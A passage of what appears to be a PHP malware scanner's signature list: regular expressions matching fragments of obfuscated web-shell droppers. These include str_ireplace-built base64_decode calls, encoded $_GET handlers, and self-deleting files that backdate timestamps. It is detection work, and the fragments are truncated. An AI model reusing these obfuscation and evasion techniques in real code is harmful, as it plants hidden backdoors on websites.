      'pattern' => '/\\<\\?php \\$sxckrgva\\=str_ireplace\\("p","","ppbpppapppspppppepp6pppp4ppp_pppppdppppeppppppcppppopppppdpppppep"\\); \\$ghdcuatbct\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    352 => 
    array (
      'pattern' => '/\\<\\?php echo "gQfbrPhZZn"; if \\(file_exists\\("\\.\\/sad_api\\.php"\\)\\)\\{ touch\\("\\.\\/sad_api\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*D9KwFmgatQQ/',
      'label' => 'source-file tail snippet',
    ),
    353 => 
    array (
      'pattern' => '/\\<\\?php \\$aqzkcm\\=str_ireplace\\("y","","yybyyyyayyysyyyeyyy6yyyyy4yyyyy_yyyyydyyyyyyeyyyyyycyyoyyyydyyyyey"\\); \\$nagthydmq\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    354 => 
    array (
      'pattern' => '/\\<\\?php \\$nxgsraw\\=str_ireplace\\("k","","kkkbkkkakkkkskkkkkkekkkk6kkkk4kk_kkkkkkdkkkkkekkkkckkkkokkkkkdkkkkkkekkk"\\); \\$hwgkskx\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    355 => 
    array (
      'pattern' => '/LypucHpzaGFoZCovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnRy/',
      'label' => 'sample-specific encoded fragment',
    ),
    356 => 
    array (
      'pattern' => '/\\<\\?php \\$rgequzw\\=str_ireplace\\("h","","hhbhhhhhahhhhhshhhehh6hh4hhhh_hhhhhdhhhehhhhchhohhhhhhdhhheh"\\); \\$bagzuw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    357 => 
    array (
      'pattern' => '/\\<\\?php echo "kWhCwSFXCA"; if \\(file_exists\\("\\.\\/mail_a_friend\\.php"\\)\\)\\{ touch\\("\\.\\/mail_a_friend\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//',
      'label' => 'source-file tail snippet',
    ),
    358 => 
    array (
      'pattern' => '/\\<\\?php \\$pacwdvsa\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$fkamwkq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    359 => 
    array (
      'pattern' => '/\\<\\?php \\$mvddvs\\=str_ireplace\\("n","","nnbnnnnnannnnnsnnnnnnennnn6nnnnn4nnn_nnnndnnnennncnnnnonnnndnnnenn"\\); \\$prqpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    360 => 
    array (
      'pattern' => '/LypjbnpkZ3NweXJyd2tkKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    361 => 
    array (
      'pattern' => '/\\<\\?php echo "dmqrmkUrwB"; if \\(file_exists\\("\\.\\/webservice\\.php"\\)\\)\\{ touch\\("\\.\\/webservice\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*MMv9F/',
      'label' => 'source-file tail snippet',
    ),
    362 => 
    array (
      'pattern' => '/\\<\\?php echo "xzvFuucsfD"; if \\(file_exists\\("\\.\\/conversationLib\\.php"\\)\\)\\{ touch\\("\\.\\/conversationLib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__/',
      'label' => 'source-file tail snippet',
    ),
    363 => 
    array (
      'pattern' => '/\\<\\?php echo "HhwFFKQCrS"; if \\(file_exists\\("\\.\\/site_search\\.php"\\)\\)\\{ touch\\("\\.\\/site_search\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*nMT/',
      'label' => 'source-file tail snippet',
    ),
    364 => 
    array (
      'pattern' => '/\\<\\?php \\$ggscqvf\\=str_ireplace\\("h","","hhbhhahhhhshhhhhehhh6hhhh4hhhh_hhhhhdhhhehhhhhchhohhhhhhdhhhehhh"\\); \\$npnmdezrf\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    365 => 
    array (
      'pattern' => '/\\<\\?php \\$swfmw\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$pqyssv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2/',
      'label' => 'source-file tail snippet',
    ),
    366 => 
    array (
      'pattern' => '/\\<\\?php \\$vxuqchd\\=str_ireplace\\("h","","hhbhhhhahhhhhshhhehh6hhhh4hhhhh_hhhhhhdhhhhhehhhhchhohhhhdhhhhehhh"\\); \\$nxuudqz\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    367 => 
    array (
      'pattern' => '/\\);\\$msfmzxwv\\=\\$svetucby\\(\\$tmydg\\);user_error\\(\\$msfmzxwv,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    368 => 
    array (
      'pattern' => '/LypxdXp0dG1mKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8qc3d6/',
      'label' => 'sample-specific encoded fragment',
    ),
    369 => 
    array (
      'pattern' => '/\\<\\?php \\$vzccqf\\=str_ireplace\\("g","","ggbgggggagggsggggggegg6ggg4gggg_ggggdggggeggggcgggggogggggdgggggegg"\\); \\$hanpwerxgh\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    370 => 
    array (
      'pattern' => '/\\);\\$thnpsa\\=\\$tzzzzubcat\\(\\$uzrmnyzxkqy\\);user_error\\(\\$thnpsa,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    371 => 
    array (
      'pattern' => '/\\<\\?php \\$kmenwhk\\=str_ireplace\\("h","","hhhbhhhhhhahhshhhhhhehhh6hhhhh4hhh_hhhdhhhhehhhchhhhohhhhhdhhhheh"\\); \\$skxawd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    372 => 
    array (
      'pattern' => '/\\<\\?php \\$dfmmsdkup\\=str_ireplace\\("y","","ybyyyyyayyyysyyyeyyyy6yyy4yyyyy_yyyydyyyeyyyyycyyyyyyoyyyydyyyyey"\\); \\$evtka\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    373 => 
    array (
      'pattern' => '/LypzZ3ZwcGViZ3Znc3h2Ki8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    374 => 
    array (
      'pattern' => '/\\<\\?php \\$uvpkynr\\=str_ireplace\\("x","","xbxxxxaxxxxxsxxxxexxxx6xxx4xxxx_xxxxxdxxxxxexxxxcxxxoxxxxxdxxxxexx"\\); \\$fzurxbp\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    375 => 
    array (
      'pattern' => '/\\<\\?php \\$qqsnkkwfy\\=str_ireplace\\("p","","pbppppappsppeppppp6ppp4ppp_pppdpppppepppcpppppoppppdpppep"\\); \\$apxcups\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    376 => 
    array (
      'pattern' => '/\\<\\?php \\$fvbcvkfwhc\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$kdzydxm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
      'label' => 'source-file tail snippet',
    ),
    377 => 
    array (
      'pattern' => '/Lyp4bW1ma3MqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lyp0d21k/',
      'label' => 'sample-specific encoded fragment',
    ),
    378 => 
    array (
      'pattern' => '/\\<\\?php \\$kgffe\\=str_ireplace\\("h","","hhbhhhhhahhhhhshhhehh6hh4hhhh_hhhhhdhhhehhhhchhohhhhhhdhhheh"\\); \\$phntbsxqv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    379 => 
    array (
      'pattern' => '/\\<\\?php \\$mnppafyu\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xx4xxxx_xxxxxxdxxxxexxcxxxxxoxxxxdxxxxex"\\); \\$fcscxnkw\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    380 => 
    array (
      'pattern' => '/\\<\\?php echo "aVxDHwAFcp"; if \\(file_exists\\("\\.\\/class\\.hurry\\.php"\\)\\)\\{ touch\\("\\.\\/class\\.hurry\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*HeR/',
      'label' => 'source-file tail snippet',
    ),
    381 => 
    array (
      'pattern' => '/60" \\/\\>\\<br \\/\\>\';
	\\} else \\{
		\\$site_domain \\= preg_replace\\( \'\\|\\^www\\\\\\.\\|\', \'\', \\$current_network\\-\\>domain \\);
		echo \'\\<input name\\=/',
      'label' => 'sample-specific literal',
    ),
    382 => 
    array (
      'pattern' => '/\\<\\?php \\$hhdxb\\=str_ireplace\\("u","","ubuuuuauuuuusuuuuueuuu6uu4uuuuu_uuduuuueuuucuuuuouuuuduuuueuu"\\); \\$ygsckd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
      'label' => 'source-file tail snippet',
    ),
    383 => 
    array (
      'pattern' => '/\\<\\?php \\$vnbvw\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwwww6wwww4www_wwdwwewwcwwwwwowwwdwwwwewww"\\); \\$fqhmhsrau\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    384 => 
    array (
      'pattern' => '/\\<\\?php \\$mzsvvkr\\=str_ireplace\\("t","","ttbttttattttstttettt6ttttt4tttt_tttttdtttetttttcttttottttdttttettt"\\); \\$sepkmysdn\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    385 => 
    array (
      'pattern' => '/\\<\\?php \\$zhfmhuk\\=str_ireplace\\("y","","yybyyyyayyysyyyeyyy6yyyyy4yyyyy_yyyyydyyyyyyeyyyyyycyyoyyyydyyyyey"\\); \\$qxpndevvmx\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    386 => 
    array (
      'pattern' => '/\\<\\?php \\$thhhsvbhb\\=str_ireplace\\("p","","pbppppappspppeppppp6pppp4ppppp_pppppdppppepppppcpppopppdpppppeppp"\\); \\$zkdmbs\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    387 => 
    array (
      'pattern' => '/Lypnc3lwY2tidXN5d3ZoKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    388 => 
    array (
      'pattern' => '/\\<\\?php \\$zhpzkgbzp\\=str_ireplace\\("x","","xbxxxxaxxxxxsxxxxexxxx6xxx4xxxx_xxxxxdxxxxxexxxxcxxxoxxxxxdxxxxexx"\\); \\$yadwakdbud\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    389 => 
    array (
      'pattern' => '/\\<\\?php echo "QKNZXvNUFR"; if \\(file_exists\\("\\.\\/clear_skin_1\\.php"\\)\\)\\{ touch\\("\\.\\/clear_skin_1\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4/',
      'label' => 'source-file tail snippet',
    ),
    390 => 
    array (
      'pattern' => '/\\<\\?php \\$yaurhu\\=str_ireplace\\("h","","hbhhahhhshhhhehhhh6hhhh4hhhh_hhhhdhhhhehhhchhhhohhhhhdhheh"\\); \\$ukzutqzq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
      'label' => 'source-file tail snippet',
    ),
    391 => 
    array (
      'pattern' => '/\\<\\?php echo "xuUKwPXSPp"; if \\(file_exists\\("\\.\\/confirm\\.php"\\)\\)\\{ touch\\("\\.\\/confirm\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dCtaeBTsNu2/',
      'label' => 'source-file tail snippet',
    ),
    392 => 
    array (
      'pattern' => '/\\<\\?php \\$ayetmppft\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqqqeqqq6qqqqq4qq_qqqqqdqqqqeqqqqqqcqqqoqqqqqqdqqqqqeqq"\\); \\$vawtdad\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    393 => 
    array (
      'pattern' => '/\\<\\?php \\$dsbqqb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$vcvtrrssf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    394 => 
    array (
      'pattern' => '/\\<\\?php echo "tcXvNqkrPe"; if \\(file_exists\\("\\.\\/foreign\\.init\\.php"\\)\\)\\{ touch\\("\\.\\/foreign\\.init\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*1/',
      'label' => 'source-file tail snippet',
    ),
    395 => 
    array (
      'pattern' => '/\\<\\?php \\$pzfkxw\\=str_ireplace\\("k","","kkbkkkakkkkskkekkkkk6kkk4kkkkk_kkkkdkkkekkkkkkckkkkkokkkdkkkkekkk"\\); \\$gmxfgm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    396 => 
    array (
      'pattern' => '/\\<\\?php \\$chgfezzr\\=str_ireplace\\("v","","vbvvvvavvvvvsvvvvvevvv6vvv4vvv_vvvvvdvvvvevvvvcvvvovvvvvdvvev"\\); \\$htygdge\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    397 => 
    array (
      'pattern' => '/\\<\\?php \\$mkaqnkd\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$dchbnrwysv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
      'label' => 'source-file tail snippet',
    ),
    398 => 
    array (
      'pattern' => '/\\<\\?php \\$zymqhvkbpk\\=str_ireplace\\("p","","pbppppappppsppppepppppp6ppp4ppppp_pppdpppppepppcpppopppppdppppepp"\\); \\$dheybs\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    399 => 
    array (
      'pattern' => '/\\<\\?php echo "aBydyVPrVm"; if \\(file_exists\\("\\.\\/order_result\\.php"\\)\\)\\{ touch\\("\\.\\/order_result\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Q/',
      'label' => 'source-file tail snippet',
    ),
    400 => 
    array (
      'pattern' => '/\\<\\?php \\$wfyke\\=str_ireplace\\("w","","wbwwwwawwwwwswwwewwww6wwww4wwww_wwdwwwewwwwwcwwwwowwwdwwwwewww"\\); \\$tbvmf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
      'label' => 'source-file tail snippet',
    ),
    401 => 
    array (
      'pattern' => '/\\$let \\= array \\("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c/',
      'label' => 'source-file head snippet',
    ),
    402 => 
    array (
      'pattern' => '/\\<\\?php \\$vvfqseb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$xwdekp\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
      'label' => 'source-file tail snippet',
    ),
    403 => 
    array (
      'pattern' => '/\\<\\?php \\$webks\\=str_ireplace\\("i","","iibiiiiaiiiiisiiiiiieiiii6iii4iiii_iiiiidiiiieiiiiiiciiiiioiidiiiei"\\); \\$pwcpks\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    404 => 
    array (
      'pattern' => '/\\/\\*\\* Sets up WordPress vars and included files\\. \\*\\/[\\s\\S]{0,12000}function Go\\(\\$url\\)\\{ \\$ch \\= curl_init\\(\\); \\$ip \\= rand\\(0,255\\)\\."\\."\\.rand\\(0,255\\)\\."\\."\\.rand\\(0,255\\)\\."\\."\\.rand\\(0,255\\) ; \\$timeout \\= 15; curl_setopt\\(\\$ch,CUR/s',
      'label' => 'source-file head-tail anchor',
    ),
    405 => 
    array (
      'pattern' => '/\\<\\?php \\$gguxvwaht\\=str_ireplace\\("q","","qbqqqqqaqqqqsqqqqeqqq6qqqq4qqq_qqqqdqqeqqqqcqqqqqqoqqqqqqdqqqeqq"\\); \\$kpunumeed\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    406 => 
    array (
      'pattern' => '/\\<\\?php \\$yrqyradz\\=str_ireplace\\("u","","uubuuuauuusuuuueuuuu6uuuu4uuuu_uuuuduuuuueuucuuuuouuuduuuuueuuu"\\); \\$dcspdcfb\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    407 => 
    array (
      'pattern' => '/\\<\\?php echo "cdBHQRVKNV"; if \\(file_exists\\("\\.\\/phpinfo\\.php"\\)\\)\\{ touch\\("\\.\\/phpinfo\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4Vx0UZsSThQ/',
      'label' => 'source-file tail snippet',
    ),
    408 => 
    array (
      'pattern' => '/\\<\\?php echo "zUxcrfVVTs"; if \\(file_exists\\("\\.\\/my\\-theaters\\.php"\\)\\)\\{ touch\\("\\.\\/my\\-theaters\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*wdN/',
      'label' => 'source-file tail snippet',
    ),
    409 => 
    array (
      'pattern' => '/\\<\\?php \\$aqhyyau\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyy6yyyyyy4yyyy_yyydyyyyeyyyycyyyyoyyydyyyyyeyyy"\\); \\$rkrnd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    410 => 
    array (
      'pattern' => '/\\<\\?php \\$aeukqaz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$pupgazgrf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    411 => 
    array (
      'pattern' => '/\\<\\?php \\$ptzqwnvbsa\\=str_ireplace\\("z","","zzbzzzzzzazzzzszzzzezzz6zzz4zzzzzz_zzzzdzzzezzczzzozzzzdzzzzez"\\); \\$bprcvyz\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    412 => 
    array (
      'pattern' => '/\\<\\?php \\$pcqxqpuhg\\=str_ireplace\\("g","","ggbgggggagggsggggggegg6ggg4gggg_ggggdggggeggggcgggggogggggdgggggegg"\\); \\$hmtsbfruau\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    413 => 
    array (
      'pattern' => '/\\<\\?php echo "gdnnypGTDW"; if \\(file_exists\\("\\.\\/nofollow\\.php"\\)\\)\\{ touch\\("\\.\\/nofollow\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*0wahuAsrm/',
      'label' => 'source-file tail snippet',
    ),
    414 => 
    array (
      'pattern' => '/\\<\\?php \\$azxusu\\=str_ireplace\\("q","","qbqqqqqaqqqqsqqqqeqqq6qqqq4qqq_qqqqdqqeqqqqcqqqqqqoqqqqqqdqqqeqq"\\); \\$pwggykh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    415 => 
    array (
      'pattern' => '/\\<\\?php \\$afqdd\\=str_ireplace\\("x","","xbxxaxxxxsxxxxxexxxx6xxx4xxx_xxxxxdxxxxxexxxxxcxxxxoxxxxxdxxxexx"\\); \\$mwnsarun\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    416 => 
    array (
      'pattern' => '/\\<\\?php \\$dkfzamusx\\=str_ireplace\\("f","","fffbfffaffffsffefffff6fffff4ffff_fffffdffeffffffcffoffffdfffffefff"\\); \\$npvqhrfc\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    417 => 
    array (
      'pattern' => '/\\<\\?php \\$mzdarfwre\\=str_ireplace\\("g","","gggbggggaggsggggeggg6gggg4gggggg_ggggdgggggegggggcggogggggdgggggeggg"\\); \\$uehacwr\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    418 => 
    array (
      'pattern' => '/\\<\\?php \\$asgxt\\=str_ireplace\\("m","","mbmmmmmammmsmmmmemmmmmm6mmmmmm4mmm_mmmmdmmemmmmmmcmmmommdmmmemmm"\\); \\$fxvkmwt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    419 => 
    array (
      'pattern' => '/\\<\\?php \\$htgmk\\=str_ireplace\\("i","","ibiiiiiiaiiisiiiieiiii6iiiii4iiii_iiiiiidiiiieiiiciiioiiiidiiiei"\\); \\$kkydnkg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    420 => 
    array (
      'pattern' => '/\\<\\?php \\$mrawuzyff\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xxxx4xx_xxxxdxxxexxxcxxxxoxxxdxxxxex"\\); \\$zwfyukfrw\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    421 => 
    array (
      'pattern' => '/\\<\\?php \\$xgbgz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$xwkpmdhv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
      'label' => 'source-file tail snippet',
    ),
    422 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$xhtxbhywrnrmfu,array\\([\\s\\S]{0,160}GMT"\\);
\\/\\/header\\(/',
      'label' => 'sample-specific literal chain',
    ),
    423 => 
    array (
      'pattern' => '/\\<\\?php \\$zqbzwa\\=str_ireplace\\("q","","qqbqqqqqqaqqqsqqqqeqqqqq6qqqqq4qqqq_qqdqqqqqeqqqqqcqqqoqqdqqeq"\\); \\$bbpnyyfdu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    424 => 
    array (
      'pattern' => '/\\<\\?php \\$wfewkcqy\\=str_ireplace\\("h","","hbhhhhhahhshhhhhhehhhhh6hhh4hhhh_hhhhhhdhhhhehhhhhchhohhhhhdhhhehhh"\\); \\$qsnzdwun\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    425 => 
    array (
      'pattern' => '/\\<\\?php \\$suxyp\\=str_ireplace\\("p","","ppbppppppappppspppppepppp6ppp4ppp_ppppdppppppeppppcppppppoppppppdppppep"\\); \\$hkthxfp\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    426 => 
    array (
      'pattern' => '/\\<\\?php echo "mhAkcQFUXH"; if \\(file_exists\\("\\.\\/affiliate_help9\\.php"\\)\\)\\{ touch\\("\\.\\/affiliate_help9\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__/',
      'label' => 'source-file tail snippet',
    ),
    427 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$npbfdbv,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
      'label' => 'sample-specific literal chain',
    ),
    428 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply     \\(\\$option, \\$win,                     array                 \\(\\$it\\)           \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    429 => 
    array (
      'pattern' => '/, __DIR__\\);
\\}
else if \\(                             empty                       \\(\\$_POST\\)\\) \\{
	
	echo/',
      'label' => 'sample-specific literal',
    ),
    430 => 
    array (
      'pattern' => '/\\<\\?php \\$wupxr\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$hfhfmfxhw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
      'label' => 'source-file tail snippet',
    ),
    431 => 
    array (
      'pattern' => '/\\<\\?php \\$bnpwvxh\\=str_ireplace\\("q","","qqqbqqqqqqaqqqqsqqqqqqeqqqq6qqqq4qqqqq_qqqdqqeqqqcqqqqoqqqqdqqqqqeqqq"\\); \\$tzbpkzqd\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    432 => 
    array (
      'pattern' => '/\\<\\?php echo "ftBXhrcGRX"; if \\(file_exists\\("\\.\\/autosuggest\\.php"\\)\\)\\{ touch\\("\\.\\/autosuggest\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2W8/',
      'label' => 'source-file tail snippet',
    ),
    433 => 
    array (
      'pattern' => '/\\<\\?php echo "RkBMEWHPXE"; if \\(file_exists\\("\\.\\/servizi\\.php"\\)\\)\\{ touch\\("\\.\\/servizi\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*rNZgVk3sAZv/',
      'label' => 'source-file tail snippet',
    ),
    434 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$hnysdxthmwrfgf,array\\([\\s\\S]{0,160}GMT"\\);
\\/\\/header\\(/',
      'label' => 'sample-specific literal chain',
    ),
    435 => 
    array (
      'pattern' => '/\\<\\?php echo "zyWCAcEXCa"; if \\(file_exists\\("\\.\\/shirt\\.config\\.php"\\)\\)\\{ touch\\("\\.\\/shirt\\.config\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*g/',
      'label' => 'source-file tail snippet',
    ),
    436 => 
    array (
      'pattern' => '/\\<\\?php \\$gaqtaz\\=str_ireplace\\("r","","rbrrrrarrrrrsrrerrrrrr6rrrr4rrrr_rrrrrdrrrerrrrrcrrrrrorrrdrrrerrr"\\); \\$ekbpusfrw\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    437 => 
    array (
      'pattern' => '/\\<\\?php \\$zkskxcfu\\=str_ireplace\\("h","","hbhhhahhhhshhhehhhhh6hhhhh4hhhhh_hhdhhhhehhhhhchhhhhohhhhdhhhhheh"\\); \\$esebrzvee\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    438 => 
    array (
      'pattern' => '/\\<\\?php \\$wrxxb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$stbassy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    439 => 
    array (
      'pattern' => '/\\<\\?php echo "BDvrpywWUy"; if \\(file_exists\\("\\.\\/config\\.youve\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.youve\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4/',
      'label' => 'source-file tail snippet',
    ),
    440 => 
    array (
